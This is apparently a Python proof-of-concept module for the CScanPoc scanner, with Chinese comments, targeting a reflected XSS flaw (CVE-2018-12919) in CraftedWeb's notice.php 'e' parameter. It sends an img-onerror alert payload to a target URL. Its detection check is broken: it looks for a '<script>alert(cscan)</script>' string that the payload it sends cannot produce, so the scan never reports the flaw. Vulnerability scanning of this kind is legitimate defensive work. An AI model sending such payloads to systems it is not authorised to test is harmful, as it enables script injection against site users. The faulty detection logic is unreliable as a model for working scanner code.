# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'CraftedWeb_0001'  # 平台漏洞编号，留空
    name = 'CraftedWeb跨站脚本漏洞'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2018-07-04'  # 漏洞公布时间
    desc = '''
        CraftedWeb是一套游戏服务器的CMS（内容管理系统）。
        CraftedWeb 2013-09-24之前版本中的aasp_includes/pages/notice.php文件存在跨站脚本漏洞。远程攻击者可借助‘e’参数利用该漏洞注入任意的Web脚本或HTML。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-13470'  # 漏洞来源
    cnvd_id = 'CNVD-2018-13470'  # cnvd漏洞编号
    cve_id = 'CVE-2018-12919 '  # cve编号
    product = 'CraftedWeb'  # 漏洞应用名称
    product_version = '2013-09-24之前版'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1fd8e889-b19c-46c3-8383-90197278d175'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/aasp_includes/pages/notice.php?e=1<img src=x onerror=alert('cscan')>"
            url = self.target + payload
            r = requests.get(url)

            if '<script>alert(cscan)</script>' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
